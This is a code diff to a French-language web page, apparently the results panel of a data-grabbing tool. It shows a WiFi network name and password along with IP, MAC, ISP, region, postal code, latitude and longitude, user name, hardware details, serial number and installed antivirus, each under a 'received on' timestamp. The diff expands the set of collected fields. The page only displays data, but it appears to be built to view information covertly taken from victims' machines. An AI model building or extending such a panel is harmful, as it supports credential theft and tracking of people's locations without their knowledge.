@@ -6,16 +6,41 @@
 </head>
 <body>
     <h1>Dernier résultat</h1>
+    <h3>📶 WiFi</h3>
     <p><b>Réseau :</b> <span id="reseau">...</span></p>
     <p><b>Mot de passe :</b> <span id="mdp">...</span></p>
+    <p><b>Signal :</b> <span id="signal">...</span></p>
+
+    <h3>🌐 Réseau</h3>
     <p><b>IP locale :</b> <span id="ip">...</span></p>
     <p><b>Passerelle :</b> <span id="passerelle">...</span></p>
-    <p><b>Nom du PC :</b> <span id="pc">...</span></p>
+    <p><b>MAC :</b> <span id="mac">...</span></p>
     <p><b>IP publique :</b> <span id="ip_public">...</span></p>
-    <p><b>Ville :</b> <span id="ville">...</span></p>
-    <p><b>Pays :</b> <span id="pays">...</span></p>
     <p><b>Fournisseur :</b> <span id="fai">...</span></p>
-    <p><b>Reçu le :</b> <span id="date">...</span></p>
+
+    <h3>📍 Localisation</h3>
+    <p><b>Pays :</b> <span id="pays">...</span></p>
+    <p><b>Région :</b> <span id="region">...</span></p>
+    <p><b>Ville :</b> <span id="ville">...</span></p>
+    <p><b>Code postal :</b> <span id="cp">...</span></p>
+    <p><b>Latitude :</b> <span id="lat">...</span></p>
+    <p><b>Longitude :</b> <span id="lon">...</span></p>
+
+    <h3>💻 Système</h3>
+    <p><b>Nom du PC :</b> <span id="pc">...</span></p>
+    <p><b>Utilisateur :</b> <span id="user_pc">...</span></p>
+    <p><b>OS :</b> <span id="os">...</span></p>
+    <p><b>CPU :</b> <span id="cpu">...</span></p>
+    <p><b>GPU :</b> <span id="gpu">...</span></p>
+    <p><b>RAM :</b> <span id="ram">...</span></p>
+    <p><b>Disque :</b> <span id="disque">...</span></p>
+    <p><b>Modèle :</b> <span id="modele">...</span></p>
+    <p><b>Fabricant :</b> <span id="fabricant">...</span></p>
+    <p><b>N° de série :</b> <span id="serial">...</span></p>
+    <p><b>Antivirus :</b> <span id="av">...</span></p>
+
+    <h3>🕐 Reçu le</h3>
+    <p><span id="date">...</span></p>
 
     <script>
         async function fetchResult() {
@@ -23,13 +48,29 @@
             const data = await res.json();
             document.getElementById("reseau").innerText = data.reseau || "—";
             document.getElementById("mdp").innerText = data.mot_de_passe || "—";
+            document.getElementById("signal").innerText = data.signal || "—";
             document.getElementById("ip").innerText = data.ip || "—";
             document.getElementById("passerelle").innerText = data.passerelle || "—";
-            document.getElementById("pc").innerText = data.pc || "—";
+            document.getElementById("mac").innerText = data.mac || "—";
             document.getElementById("ip_public").innerText = data.ip_public || "—";
-            document.getElementById("ville").innerText = data.ville || "—";
-            document.getElementById("pays").innerText = data.pays || "—";
             document.getElementById("fai").innerText = data.fai || "—";
+            document.getElementById("pays").innerText = data.pays || "—";
+            document.getElementById("region").innerText = data.region || "—";
+            document.getElementById("ville").innerText = data.ville || "—";
+            document.getElementById("cp").innerText = data.cp || "—";
+            document.getElementById("lat").innerText = data.lat || "—";
+            document.getElementById("lon").innerText = data.lon || "—";
+            document.getElementById("pc").innerText = data.pc || "—";
+            document.getElementById("user_pc").innerText = data.user_pc || "—";
+            document.getElementById("os").innerText = data.os || "—";
+            document.getElementById("cpu").innerText = data.cpu || "—";
+            document.getElementById("gpu").innerText = data.gpu || "—";
+            document.getElementById("ram").innerText = data.ram || "—";
+            document.getElementById("disque").innerText = data.disque || "—";
+            document.getElementById("modele").innerText = data.modele || "—";
+            document.getElementById("fabricant").innerText = data.fabricant || "—";
+            document.getElementById("serial").innerText = data.serial || "—";
+            document.getElementById("av").innerText = data.av || "—";
             document.getElementById("date").innerText = new Date(new Date(data.created_at).getTime() + 2 * 60 * 60 * 1000).toLocaleString("fr-FR");
         }
 
